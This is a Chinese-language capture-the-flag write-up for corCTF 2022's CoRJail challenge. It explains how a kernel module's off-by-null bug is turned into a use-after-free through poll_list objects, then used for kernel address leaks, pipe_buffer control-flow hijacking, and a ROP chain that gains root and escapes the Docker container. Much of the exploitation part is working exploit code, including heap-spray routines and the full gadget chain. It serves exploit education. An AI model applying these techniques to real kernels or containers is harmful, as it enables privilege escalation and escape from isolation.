# 漏洞原理

`cormon_proc_write`函数中存在一处很明显的`off-by-null`漏洞：

    
    
    static ssize_t cormon_proc_write(struct file *file, const char __user *ubuf, size_t count, loff_t *ppos) 
    {
        [...]
    
        len = count > PAGE_SIZE ? PAGE_SIZE - 1 : count; // [1]当count等于PAGE_SIZE时,len等于PAGE_SIZE
    
        syscalls = kmalloc(PAGE_SIZE, GFP_ATOMIC); // [2]申请一个PAGE_SIZE大小的堆块
        printk(KERN_INFO "[CoRMon::Debug] Syscalls @ %#llx\n", (uint64_t)syscalls);
    
        if (!syscalls)
        {
            printk(KERN_ERR "[CoRMon::Error] kmalloc() call failed!\n");
            return -ENOMEM;
        }
    
        if (copy_from_user(syscalls, ubuf, len)) // [3]从用户空间拷贝数据到内核空间
        {
            printk(KERN_ERR "[CoRMon::Error] copy_from_user() call failed!\n");
            return -EFAULT;
        }
    
        syscalls[len] = '\x00'; // [4]当len=PAGE_SIZE时,syscalls[PAGE_SIZE] = '\x00',越界写null
    
        [...]
    }
    

当写入字节为4096时，len被设置为4096,而`syscalls[4096] = '\x00'`会导致一个`null`字节写入界外。

# 题目限制

由于作者为了展示在[Google
KCTF漏洞奖励计划](https://google.github.io/kctf/vrp.html)中新颖的内核漏洞利用技术,也就是[CVE-2022-27666](https://nvd.nist.gov/vuln/detail/CVE-2022-27666)中对应的[exp7](https://docs.google.com/document/d/1a9uUAISBzw3ur1aLQqKc5JOQLaJYiOP5pe_B4xCT1KA/edit#heading=h.jw0s97sl1vd8),给题目加了很多的限制:

### 保护全开

所有现代的保护措施，如内核地址空间布局随机化 (`KASLR`)、用户模式执行保护 (`SMEP`)、用户模式访问保护 (`SMAP`)、内核页面表隔离
(`KPTI`)、SLAB分配器随机化 (`CONFIG_SLAB_FREELIST_RANDOM`)、SLAB分配器硬化保护
(`CONFIG_SLAB_FREELIST_HARDENED`) 等都已启用`CONFIG_STATIC_USERMODEHELPER`被设置为
true迫使用户模式辅助程序通过单一的二进制文件调用，并且 `CONFIG_STATIC_USERMODEHELPER_PATH` 被设置为空字符串，即没有
[modprobe_path
技巧](https://github.com/smallkirby/kernelpwn/blob/master/technique/modprobe_path.md)。`CONFIG_DEBUG_FS`
和 `CONFIG_KALLSYMS_ALL` 被取消设置，使得许多符号在`/proc/kallsyms`中不可用。

### 减少内核攻击面

特意没有编译某些子系统，比如[io_uring](https://kernel.dk/io_uring.pdf)和[nftables](https://wiki.nftables.org/wiki-nftables/index.php/What_is_nftables%3F)，以减少攻击面。

### 禁用多个系统调用

CoRJail运行在一个定制的Debian Bullseye镜像的加固Docker容器上。默认的[Docker
seccomp配置文件](https://github.com/moby/moby/blob/master/profiles/seccomp/default.json)被修改以阻止多个系统调用，包括[msgget()](https://linux.die.net/man/2/msgget)/[msgsnd()](https://linux.die.net/man/2/msgsnd)和[msgrcv()](https://linux.die.net/man/2/msgrcv)。定制的seccomp配置文件可以在[这里](https://github.com/Crusaders-of-Rust/corCTF-2022-public-challenge-archive/blob/master/pwn/corjail/task/build/coros/files/docker/seccomp.json)找到。

# 漏洞利用

漏洞利用用到了[poll_list](https://elixir.bootlin.com/linux/v5.10.127/source/fs/select.c#L839)结构，[seq_operations](https://elixir.bootlin.com/linux/v5.10.127/source/include/linux/seq_file.h#L31)结构，[user_key_payload](https://elixir.bootlin.com/linux/v5.10.127/source/include/keys/user-type.h#L27)结构，[tty_file_private](https://elixir.bootlin.com/linux/v5.10.127/source/include/linux/tty.h#L347)结构和[pipe_buff](https://elixir.bootlin.com/linux/v5.10.127/source/include/linux/pipe_fs_i.h#L26)结构。这里我主要介绍一下`poll_list`结构。

### poll_list结构

[poll_list](https://elixir.bootlin.com/linux/v5.10.127/source/fs/select.c#L839)结构体:

    
    
    struct poll_list {
        struct poll_list *next; // 指向下一个poll_list
        int len; // 对应于条目数组中pollfd结构的数量
        struct pollfd entries[]; // 存储pollfd结构的数组
    };
    

当我们使用[poll](https://linux.die.net/man/3/poll)函数来监视一个或多个文件描述符上的活动时，会在内核空间分配。

    
    
    #include <fcntl.h>
    #include <poll.h>
    //int poll(struct pollfd fds[], nfds_t nfds, int timeout); 
    //fds:一个pollfd结构的数组
    //nfds:表示'fds'数组中的文件描述符数量
    //timeout:表示超时时间，单位是毫秒。
    int main(int argc, char *argv[]) {
        struct pollfd *pfds;
        int fd;
        int nfds = 256;
        int timeout = 3000;
        pfds = calloc(nfds,sizeof(struct pollfd));
        fd = open("/etc/passwd", O_RDONLY);
        for (int i = 0; i < nfds; i++)
        {
            pfds[i].fd = fd;
            pfds[i].events = POLLERR;
        }
        poll(pfds, nfds, timeout);
    //将会进行阻塞，阻塞的时间由timeout决定
    }
    

内核调用栈:  
![](./img/1766761878630716872.png)  
内核函数[do_sys_poll()](https://elixir.bootlin.com/linux/v5.10.127/source/fs/select.c#L973)在`[4]`处能申请到
kmalloc-32 到 kmalloc-4k 的内核堆:

    
    
    #define POLL_STACK_ALLOC 256
    #define PAGE_SIZE 4096
    
    #define POLLFD_PER_PAGE  ((PAGE_SIZE-sizeof(struct poll_list)) / sizeof(struct pollfd))
    
    #define N_STACK_PPS ((sizeof(stack_pps) - sizeof(struct poll_list))  / \
                sizeof(struct pollfd))
    
    [...]
    
    static int do_sys_poll(struct pollfd __user *ufds, unsigned int nfds,
            struct timespec64 *end_time)
    {
    
        struct poll_wqueues table;
        int err = -EFAULT, fdcount, len;
        /* Allocate small arguments on the stack to save memory and be
            faster - use long to make sure the buffer is aligned properly
            on 64 bit archs to avoid unaligned access */
        long stack_pps[POLL_STACK_ALLOC/sizeof(long)]; // [1]为了节省内存并提高速度而分配的堆栈
        struct poll_list *const head = (struct poll_list *)stack_pps;
        struct poll_list *walk = head;
        unsigned long todo = nfds;
    
        if (nfds > rlimit(RLIMIT_NOFILE))
            return -EINVAL;
    
        len = min_t(unsigned int, nfds, N_STACK_PPS); // [2]最多存储30个pollfd条目
    
        for (;;) {
            walk->next = NULL;
            walk->len = len;
            if (!len)
                break;
    
            if (copy_from_user(walk->entries, ufds + nfds-todo,
                        sizeof(struct pollfd) * walk->len))
                goto out_fds;
    
            todo -= walk->len;
            if (!todo)
                break;
    
            len = min(todo, POLLFD_PER_PAGE); // [3]每页最多可以分配POLLFD_PER_PAGE(510)个条目
            walk = walk->next = kmalloc(struct_size(walk, entries, len),
                            GFP_KERNEL); // [4]可以通过控制len，也就是控制被监控的文件描述符的数量来控制分配的大小，范围从 kmalloc-32 到 kmalloc-4k;
            if (!walk) {
                err = -ENOMEM;
                goto out_fds;
            }
        }
    
        poll_initwait(&table);
        fdcount = do_poll(head, &table, end_time); // [5]监视所提供的文件描述符，直到特定事件发生或定时器过期。[5]
        poll_freewait(&table);
    
        if (!user_write_access_begin(ufds, nfds * sizeof(*ufds))and)
            goto out_fds;
    
        for (walk = head; walk; walk = walk->next) {
            struct pollfd *fds = walk->entries;
            int j;
    
            for (j = walk->len; j; fds++, ufds++, j--)
                unsafe_put_user(fds->revents, &ufds->revents, Efault);
        }
        user_write_access_end();
    
        err = fdcount;
    out_fds:
        walk = head->next;
        while (walk) { // [6]遍历单链表,释放每一个结构
            struct poll_list *pos = walk;
            walk = walk->next;
            kfree(pos);
        }
    
        return err;
    
    Efault:
        user_write_access_end();
        err = -EFAULT;
        goto out_fds;
    }
    

当我们调用`poll`函数，并向poll函数提供`30+510+1`个文件描述符时，`poll_list`在堆中的结构如下(还有30个在栈上):  
![](./img/3621137495128082957.png)  
在所有`poll_list`对象分配完之后，在[5]处有个对[do_poll](https://elixir.bootlin.com/linux/v5.10.127/source/fs/select.c#L884)的调用，它将监视所提供的文件描述符，直到一个特定的事件发生或计时器过期。  
值得注意的是`poll_list`是如何被释放的：在`[6]`处，一个while循环被用来遍历poll_list单链表并释放结构，这意味着我们可以通过覆盖`poll_list->next`指针造成越界释放的效果。同时`while`的判断条件是`poll_list`结构的第一个`QWORD`是否为空，这可以通过对齐错误的释放(假设你有一个指向对象X的指针，但第一个`QWORD`不为空。对齐错误的释放意味着从指针中减去N个字节，例如0x10字节，这样它就指向了内存中前一个对象的最后几个`QWORD`。然后释放这个指针指向的内存。`劫持控制流的时候用到了这个技巧`)或者我们可以简单地以第一个QWORD等于0的结构为目标来满足条件(`泄露指针的时候用到了这个技巧`)。

## 泄露内核基地址

我们采用`poll_list`对象，`user_key_payload`对象，`seq_operations`对象来泄露堆地址。

### 一些必要的初始化操作

首先，我们要打开有漏洞的模块。  
使用`assign_to_core()`将当前进程绑定到CPU0，因为我们是在一个多核环境中工作，而slab是按CPU分配的。  
堆喷大量的`seq_operations`，填充kmalloc-32。

    
    
    fd = open("/proc_rw/cormon", O_RDWR);
    
    void assign_to_core(int core_id)
    {
        cpu_set_t mask;
        CPU_ZERO(&mask);
        CPU_SET(core_id, &mask);
    
        if (sched_setaffinity(getpid(), sizeof(mask), &mask) < 0)
        {
            perror("[X] sched_setaffinity()");
            exit(1);
        }
    }
    
        assign_to_core(0);
    
        for (int i = 0; i < 2048; i++)
            alloc_seq_ops(i);
    

### 用poll_list和user_key_payload进行堆布局

分配一些`user_key_payload`，注意`user_key_payload`的第一个QWORD必须为NULL。可以使用[setxattr](https://elixir.bootlin.com/linux/v5.10.127/source/fs/xattr.c#L533)函数来设置：具体来说就是kmalloc申请的堆块不一定是为NULL的，不过堆块的申请与释放遵循LIFO原则，所以可以先用`setxattr`函数将堆块置空，再将堆块分配给`user_key_payload`结构。

    
    
    int alloc_key(int id, char *buff, size_t size)
    {
        char desc[256] = { 0 };
        char *payload;
        int key;
        size -= sizeof(struct user_key_payload);
        sprintf(desc, "payload_%d", id);
        payload = buff ? buff : calloc(1, size);
        if (!buff)
            memset(payload, id, size);    
    
        key = add_key("user", desc, payload, size, KEY_SPEC_PROCESS_KEYRING);
    
        if (key < 0)
        {
            perror("[X] add_key()");
            return -1;
        }    
    
        return key;
    }
    
        for (int i = 0; i < 72; i++)
        {   
            setxattr("/home/user/.bashrc", "user.x", data, 32, XATTR_CREATE);
            keys[i] = alloc_key(n_keys++, key, 32);
        }
    

此时堆布局如下：未分配的块为白色，`poll_list`为绿色，`user_key_payload`为橙色。  
![](./img/7616106069907560584.png)  
再申请一些`user_key_payload`增大成功率，此时堆布局如下：  
![](./img/4814617339785480879.png)

### 触发漏洞，将off-by-null转化为UAF

对`cormon`进行写,将会调用定义的`cormon_proc_write`函数，触发漏洞，有概率篡改`poll_list->next`指针。  
![](./img/7557730491486696513.png)  
用`pthread_join`函数等待线程结束，触发越界释放。  
![](./img/2918397166076844776.png)  
同时申请一些`seq_operations`结构，造成`user_key_payload`结构和`seq_operations`结构重叠。  
![](./img/5054932232355436830.png)

    
    
    void join_poll_threads(void)
    {
        for (int i = 0; i < poll_threads; i++)
        {   
            pthread_join(poll_tid[i], NULL);          
            open("/proc/self/stat", O_RDONLY);
        }
    
        poll_threads = 0;
    }
    
        write(fd, data, PAGE_SIZE);
        join_poll_threads();
    

### 用keyctl_read函数读数据，泄露基地址

    
    
    char *get_key(int i, size_t size)
    {
        char *data;
    
        data = calloc(1, size);
        keyctl_read(keys[i], data, size);
        return data;
    }
        key = get_key(i, 0x10000);
        leak = (uint64_t *)key;
    

## 泄露内核堆地址

泄露内核堆地址主要是用到了`user_key_payload`结构和`tty_file_private`结构。  
因为`user_key_payload->datalen`刚好被`seq_operations->single_next`覆盖为一个很大的值，所以可以用来越界读,读取的对象是`tty_file_private`，可以通过`open("/dev/ptmx",O_RDWR
| O_NOCTTY)`打开。  
![](./img/7748466441843573649.png)

    
    
    void free_key(int i){
        keyctl_revoke(keys[i]);
        keyctl_unlink(keys[i],-2);
        n_keys--;
    }
    
    void free_all_keys( bool skip_corrupted_key){
        int total = n_keys;
        for(int i = 0;i<total;i++){
            if(skip_corrupted_key && i == corrupted_key)
                continue;
            free_key(i);
        }
        sleep(1);
    }
    void alloc_tty(int i){
        ptmx[i] = open("/dev/ptmx",O_RDWR | O_NOCTTY);
        if (ptmx[i] < 0)
        {
            perror("[X] alloc_tty()");
            exit(1);
        }
    }
    
        key = read_key(corrupted_key,0x20000);
        leak = (uint64_t*)key;
    

![](./img/5470370439825208071.png)

## 劫持控制流

劫持控制流用到了`poll_list`对象，`user_key_payload`对象和`pipe_buffer`对象。  
首先用`close()`释放掉被`seq_operations`和`user_key_payload`占据的堆块。  
然后用`poll_list`对象占据，此时UAF的堆块被`user_key_payload`和`poll_list`占据。  
释放掉`user_key_payload`对象，接着用`setxattr`函数将堆块的第一个QWORD改为泄露出来的堆地址-0x18，这样接下来就能刚好在堆地址起始处伪造`pipe_buffer`结构。将
[anon_pipe_buf_ops](https://elixir.bootlin.com/linux/v5.10.127/source/fs/pipe.c#L213)覆盖为指向我们的rop链的指针，然后close就能成功提权。  
![](./img/5345833550905945076.png)

    
    
    for (int i = 2048; i < 2048 + 128; i++)
            free_seq_ops(i);  //释放seq_operations
        assign_to_core(randint(1, 3));
    
        for (int i = 0; i < 192; i++)
            create_poll_thread(i, 24, 3000, true);//创建0x20大小的poll_list对象
    
        assign_to_core(0);
    
        while (poll_threads != 192) { }; 
        usleep(250000);
        free_key(corrupted_key);  //释放掉有漏洞的user__key_payload对象
        sleep(1); // GC key
        *(uint64_t *)&data[0] = target_object - 0x18;
    
        for (int i = 0; i < MAX_KEYS; i++)
        {
            setxattr("/home/hi/lol.txt", "user.x", data, 32, XATTR_CREATE); //将poll_list->next改为泄露出来的堆地址-0x18
            keys[i] = alloc_key(n_keys++, key, 32); //起的是一个占位作用,避免堆块被其它的结构污染
        }
        for (int i = 0; i < 72; i++)
            free_tty(i);
    
        sleep(1); // GC TTYs
        for (int i = 0; i < 1024; i++)
            alloc_pipe_buff(i);
        while (poll_threads != 0) {};
        free_all_keys(false); //释放掉所有的user_key_payload,因为add_key能申请的key是有上限的,超过了就无法申请
        for (int i = 0; i < 31; i++)
            keys[i] = alloc_key(n_keys++, buff, 600);       //从0开始伪造 pipe_buffer
        for (int i = 0; i < 1024; i++)
            release_pipe_buff(i);     //劫持控制流
    

## ROP

我们将`anon_pipe_buf_ops`指向rop链来劫持控制流(栈迁移)`[1]`，然后用[prepare_kernel_cred()](https://elixir.bootlin.com/linux/v5.10.127/source/kernel/cred.c#L682)
`[2]` 和
[commit_creds()](https://elixir.bootlin.com/linux/v5.10.127/source/kernel/cred.c#L437)
`[3]` 来提权，然后我们用[find_task_by_vpid()
](https://elixir.bootlin.com/linux/v5.10.127/source/kernel/pid.c#L420)`[4]`
来定位Docker容器任务，我们用[switch_task_namespaces()](https://elixir.bootlin.com/linux/v5.10.127/source/kernel/nsproxy.c#L242)
`[5]`
将其nsproxy结构改为[init_nsproxy](https://elixir.bootlin.com/linux/v5.10.127/source/kernel/nsproxy.c#L32)。但这还不足以从容器中逃逸。  
在Docker容器中，与谷歌的kCTF不同，[setns()](https://linux.die.net/man/2/setns)被seccomp默认屏蔽了，这意味着我们在返回用户空间后不能用它来进入其他命名空间。我们需要找到一种替代方法，并且需要在ROP链中实现它。  
阅读[setns()](https://linux.die.net/man/2/setns)的源代码，我们可以看到它调用[commit_nsset()](https://elixir.bootlin.com/linux/v5.10.127/source/kernel/nsproxy.c#L498)来实际移动任务到不同的命名空间。我们可以用[copy_fs_struct()](https://elixir.bootlin.com/linux/v5.10.127/source/fs/fs_struct.c#L112)复制它的做法，克隆[init_fs](https://elixir.bootlin.com/linux/v5.10.127/source/fs/fs_struct.c#L163)结构`[6]`，然后用[find_task_by_vpid()
](https://elixir.bootlin.com/linux/v5.10.127/source/kernel/pid.c#L420)定位当前任务`[7]`，用
gadget
手动安装新[fs_struct](https://elixir.bootlin.com/linux/v5.10.127/source/fs/fs_struct.c#L163)。[8]  
我们最后可以使用`swapgs_restore_regs_and_return_to_usermode`绕过KPTI，在主机上获得一个shell。[9]

    
    
    buff = (char *)calloc(1, 1024);
    
    // Stack pivot    [1]
    *(uint64_t *)&buff[0x10] = target_object + 0x30;             // anon_pipe_buf_ops
    *(uint64_t *)&buff[0x38] = kernel_base + 0xffffffff81882840; // push rsi ; in eax, dx ; jmp qword ptr [rsi + 0x66]
    *(uint64_t *)&buff[0x66] = kernel_base + 0xffffffff810007a9; // pop rsp ; ret
    *(uint64_t *)&buff[0x00] = kernel_base + 0xffffffff813c6b78; // add rsp, 0x78 ; ret
    
    // ROP
    rop = (uint64_t *)&buff[0x80];
    
    // creds = prepare_kernel_cred(0)   [2]
    *rop ++= kernel_base + 0xffffffff81001618; // pop rdi ; ret
    *rop ++= 0;                                // 0
    *rop ++= kernel_base + 0xffffffff810ebc90; // prepare_kernel_cred
    
    // commit_creds(creds)    [3]
    *rop ++= kernel_base + 0xffffffff8101f5fc; // pop rcx ; ret
    *rop ++= 0;                                // 0
    *rop ++= kernel_base + 0xffffffff81a05e4b; // mov rdi, rax ; rep movsq qword ptr [rdi], qword ptr [rsi] ; ret
    *rop ++= kernel_base + 0xffffffff810eba40; // commit_creds
    
    // task = find_task_by_vpid(1)    [4]
    *rop ++= kernel_base + 0xffffffff81001618; // pop rdi ; ret
    *rop ++= 1;                                // pid
    *rop ++= kernel_base + 0xffffffff810e4fc0; // find_task_by_vpid
    
    // switch_task_namespaces(task, init_nsproxy)    [5]
    *rop ++= kernel_base + 0xffffffff8101f5fc; // pop rcx ; ret
    *rop ++= 0;                                // 0
    *rop ++= kernel_base + 0xffffffff81a05e4b; // mov rdi, rax ; rep movsq qword ptr [rdi], qword ptr [rsi] ; ret
    *rop ++= kernel_base + 0xffffffff8100051c; // pop rsi ; ret
    *rop ++= kernel_base + 0xffffffff8245a720; // init_nsproxy;
    *rop ++= kernel_base + 0xffffffff810ea4e0; // switch_task_namespaces
    
    // new_fs = copy_fs_struct(init_fs)    [6]
    *rop ++= kernel_base + 0xffffffff81001618; // pop rdi ; ret
    *rop ++= kernel_base + 0xffffffff82589740; // init_fs;
    *rop ++= kernel_base + 0xffffffff812e7350; // copy_fs_struct;
    *rop ++= kernel_base + 0xffffffff810e6cb7; // push rax ; pop rbx ; ret
    
    // current = find_task_by_vpid(getpid())    [7]
    *rop ++= kernel_base + 0xffffffff81001618; // pop rdi ; ret
    *rop ++= getpid();                         // pid
    *rop ++= kernel_base + 0xffffffff810e4fc0; // find_task_by_vpid
    
    // current->fs = new_fs    [8]
    *rop ++= kernel_base + 0xffffffff8101f5fc; // pop rcx ; ret
    *rop ++= 0x6e0;                            // current->fs
    *rop ++= kernel_base + 0xffffffff8102396f; // add rax, rcx ; ret
    *rop ++= kernel_base + 0xffffffff817e1d6d; // mov qword ptr [rax], rbx ; pop rbx ; ret
    *rop ++= 0;                                // rbx
    
    // kpti trampoline    [9]
    *rop ++= kernel_base + 0xffffffff81c00ef0 + 22; // swapgs_restore_regs_and_return_to_usermode + 22
    *rop ++= 0;
    *rop ++= 0;
    *rop ++= (uint64_t)&win;
    *rop ++= usr_cs;
    *rop ++= usr_rflags;
    *rop ++= (uint64_t)(stack + 0x5000);
    *rop ++= usr_ss;
    

利用成功截图(题目需要ext4文件系统,可以用[create-image.sh](https://github.com/google/syzkaller/blob/master/tools/create-image.sh)制作或者从其他地方copy一份过来)：  
![](./img/2031097390814319551.png)

# 参考

[exploit.c](https://syst3mfailure.io/corjail/assets/files/exploit.c)  
[[corCTF 2022] CoRJail: From Null Byte Overflow To Docker Escape Exploiting
poll_list Objects In The Linux Kernel](https://syst3mfailure.io/corjail/)  
[【Exploit trick】利用poll_list对象构造kmalloc-32任意释放 (corCTF
2022-CoRJail)](https://blog.csdn.net/panhewu9919/article/details/127804902?spm=1001.2014.3001.5501)  
[题目环境](https://github.com/Crusaders-of-Rust/corCTF-2022-public-challenge-archive/tree/master/pwn/corjail)

